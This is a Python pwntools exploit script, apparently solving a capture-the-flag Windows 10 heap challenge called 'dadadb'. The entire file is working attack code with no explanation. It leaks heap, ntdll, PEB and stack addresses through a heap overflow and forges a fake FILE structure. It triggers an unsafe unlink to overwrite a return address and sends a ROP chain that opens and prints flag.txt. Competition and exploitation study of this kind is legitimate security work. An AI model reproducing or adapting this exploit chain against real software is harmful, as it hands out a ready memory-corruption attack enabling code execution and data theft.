from pwn import *

HOST = "127.0.0.1"
PORT = 4869

'''
Heap Chunk Structure

struct dada_chunk {
  _BYTE *pData;
  SIZE_T szDataSize;
  _BYTE key[64];
  _QWORD padding;
  struct data_chunk *next;
}
'''

# context.log_level = "debug"
context.arch = "amd64"

r = remote(HOST, PORT)
r.sla = r.sendlineafter
r.sa = r.sendafter

log.info("This Exploit based on Microsoft Windows [Version 10.0.18363.836], Windows 10 x64")

def alloc(id, data, size=0):
    if size == 0:
        size = len(data) + 1

    r.sla(">> ", str(1))
    r.sla("Key:", str(id))
    r.sla("Size:", str(size))
    r.sla("Data:", data)

def show(id, size):
    r.sla(">> ", str(2))
    r.sla("Key:", str(id))
    r.recvn(5) # "Data:" string
    return r.recvn(size)

def delete(id):
    r.sla(">> ", str(3))
    r.sla("Key:", str(id))


# login as orange
r.sla(">> ", str(1))
r.sla("User:", "orange")
r.sla("Password:", "godlike")

alloc(1, "This is 1st chunk", 0x100)
alloc(1, "This is 2nd chunk", 0x20)
alloc(2, "This is target chunk to leak")

tmp_buf = show(1, 0x100)

heap_encod = u64(tmp_buf[0x28:0x30]) ^ 0x1000000306010007
log.info("_HEAP->Encoding = 0x{:016x}".format(heap_encod))

heap_base  = u64(tmp_buf[0x30:0x38]) & ~0xfff
log.info("_HEAP = 0x{:016x}".format(heap_base))

delete(1)
delete(2)

def readPtr(addr):
    alloc('x', "First Chunk", 0x100)
    alloc('x', "Chunk For leak", 0x20)
    alloc('y', "Target Chunk To overwrite", 0x20)
    orig_ptr = u64(show('x', 0x100)[0x30:0x38])

    payload = flat([
        0, 0, 0, 0, 0,
        heap_encod ^ 0x1000000306010007,
        addr,
        0x20,
        ord("y")
    ])

    alloc('x', payload, 0x20)
    result = u64(show('y', 0x20)[:8])

    # restore original pointer for de-allocate
    payload = flat([
        0, 0, 0, 0, 0,
        heap_encod ^ 0x1000000306010007,
        orig_ptr,
        0x20,
        ord("y")
    ])

    # restore original pData for de-allocate
    alloc('x', payload, 0x20)

    # de-allocate to prevent LFH enable
    # LFH is non-deterministic, it will ruin everything
    delete('x')
    delete('y')
    return result


ntdll_base = readPtr(heap_base+0x2c0) - 0x163dd0
log.info("ntdll = 0x{:016x}".format(ntdll_base))

peb_base = readPtr(ntdll_base + 0x165348) - 0x80
log.info("_PEB = 0x{:016x}".format(peb_base))

stack_base = readPtr(peb_base + 0x1008)
log.info("stack = 0x{:016x}".format(stack_base))

dadadb_base = readPtr(readPtr(ntdll_base + 0x1653d0) + 0x30)
log.info("dadadb = 0x{:016x}".format(dadadb_base))

fopen_s_func = readPtr(dadadb_base + 0x31A8)
log.info("fopen_s() = 0x{:016x}".format(fopen_s_func))

fread_func = readPtr(dadadb_base + 0x3208)
log.info("fread() = 0x{:016x}".format(fread_func))

write_func = readPtr(dadadb_base + 0x31B8)
log.info("write() = 0x{:016x}".format(write_func))


alloc('x', "First Chunk", 0x100)
alloc('x', "Chunk For leak", 0x20)
alloc('y', "Target Chunk To overwrite", 0x20)
orig_ptr = u64(show('x', 0x100)[0x30:0x38])
payload = flat([
    0, 0, 0, 0, 0,
    heap_encod ^ 0x1000000306010007,
    stack_base - 0x1000,
    0x1000,
    ord("y")
])
alloc('x', payload, 0x20)

cursor = dadadb_base + 0x1b60
write_ret = 0

buf = show('y', 0x1000)

for i in range(0, 0x1000, 8):
    val = u64(buf[i:i+8])
    if val == cursor:
        write_ret = stack_base - (0x1000-i)
        break

if write_ret == 0:
    log.failure("can't find return address on stack")
    sys.exit(-1)

# restore original pointer for de-allocate
payload = flat([
    0, 0, 0, 0, 0,
    heap_encod ^ 0x1000000306010007,
    orig_ptr,
    0x20,
    ord("y")
])
alloc('x', payload, 0x20)

delete('x')
delete('y')

log.info("return address location = 0x{:016x}".format(write_ret))

# enable LFH on size 0x70( = sizeof(dadadb_chunk) + sizeof(_HEAP_ENTRY) )
# it will prevent dadadb allocated on same chunk with pData
for i in range(0x14):
    alloc("enable LFH" + str(i), "ssibal", 0x90)

alloc(1, "A", 0x400)
alloc(1, "X" * 0x10 + "A" * 8, 0x200)  # should be bigger than other chunk, 
                                       # If not, it wll allocated on freed chunk 4 

alloc(2, "X" * 0x10 + "B" * 8, 0x1f0)
alloc(3, "X" * 0x10 + "C" * 8, 0x1f0)  # prevent free coalescence
alloc(4, "X" * 0x10 + "D" * 8, 0x1f0)
alloc(5, "X" * 0x10 + "E" * 8, 0x1f0)

delete(4)
delete(2)

target_chunk = show(1, 0x400).split("BBBBBBBB")[0][-0x20:]
target_header = u64(target_chunk[8:16])
target_fd = u64(target_chunk[16:24])
target_bk = u64(target_chunk[24:32])

username = "orange\x00\x00"
username += flat([
    target_header,
    0xdeadbeef,
    dadadb_base + 0x5648 + 0x10
])

password = "godlike\x00"
password += flat([
    target_header,
    dadadb_base + 0x5620 + 0x10,
    target_fd - 0x400
])

r.sla(">> ", str(4))
r.sla(">> ", str(1))
r.sa("User:", username)
r.sa("Password:", password)

fake_chunk = flat([
    0,
    target_header,
    dadadb_base + 0x5648 + 0x10,
    target_bk
])

# https://github.com/tritao/WindowsSDK/blob/6d43c73/SDKs/SourceDir/Windows%20Kits/10/Source/10.0.17763.0/ucrt/inc/corecrt_internal_stdio.h#L121
fake_FILE = ""
fake_FILE += p64(write_ret)            # _ptr     = target to write
fake_FILE += p64(write_ret)            # _base    = target to write
fake_FILE += p32(0)                    # _cnt     = 0
fake_FILE += p32(0x2041)               # _flags   = _IOALLOCATED | _IOBUFFER_CRT | _IOREAD
fake_FILE += p32(0)                    # _file    = STDIN
fake_FILE += p32(0)                    # _charbuf = NULL
fake_FILE += p64(0x200)                # _bufsiz  = 0x200
fake_FILE += p64(0)                    # _tmpname = NULL

# https://doxygen.reactos.org/db/dbb/winbase_8h_source.html#l00871
fake_FILE += p64(0xffffffffffffffff)   # _lock.DebugInfo
fake_FILE += p32(0xffffffff)           # _lock.LockCount
fake_FILE += p32(0) + p64(0) * 3       # blahblah

fake_FILE = fake_FILE.ljust(0x200, p8(0))

alloc(1, fake_FILE + fake_chunk, 0x200)
alloc(4, "TRIGGER-ing unsafe unlink", 0x1f0)
alloc(2, "A" * 0x10 + p64(target_fd - 0x610), 0x1f0)

r.sla(">> ", str(4))
r.sla(">> ", str(1))
r.sla("User:", "flag.txt\x00")
r.sla("Password:", "get Input From STDIN")

# can't use ucrtbase.dll *directly*, because original challenge doesn't provide dll
call_exit_0 = dadadb_base + 0x1246

mode_r_addr = dadadb_base + 0x3314
flag_txt_addr = dadadb_base + 0x5620
flag_buf = dadadb_base + 0x5670

pop_rcx_ret = ntdll_base + 0x8fd71
pop_rdx_r11_ret = ntdll_base + 0x8c437
pop_r8_ret = ntdll_base + 0x4d6bf
pop_r9_r10_r11_ret = ntdll_base + 0x8c434
add_rsp_0x28_ret = ntdll_base + 0x112d

rop_chain = flat([
    # fopen_s(File, "flag.txt", "r")
    pop_rcx_ret,
    write_ret + (8 * 22),
    pop_rdx_r11_ret,
    flag_txt_addr, 0,
    pop_r8_ret,
    mode_r_addr,
    fopen_s_func,
    add_rsp_0x28_ret,
    0, 0, 0, 0, 0,


    # fread(flag_buf, 0x80, 1, File)
    pop_rcx_ret,
    flag_buf,
    pop_rdx_r11_ret,
    0x80, 0,
    pop_r8_ret,
    1,
    pop_r9_r10_r11_ret,
    0xdeadbeef, 0, 0, # will be replace to FILE pointer
    fread_func,
    add_rsp_0x28_ret,
    0, 0, 0, 0, 0,

    # write(1, flag_buf, 0x80)
    pop_rcx_ret,
    1,
    pop_rdx_r11_ret,
    flag_buf, 0, 
    pop_r8_ret,
    0x80,
    write_func,
    add_rsp_0x28_ret,
    0, 0, 0, 0, 0,

    # exit()
    call_exit_0
])

rop_chain = rop_chain.ljust(0x200, p8(0))

r.send(rop_chain)

r.recvline()
log.info(r.recvuntil("}"))
r.close()

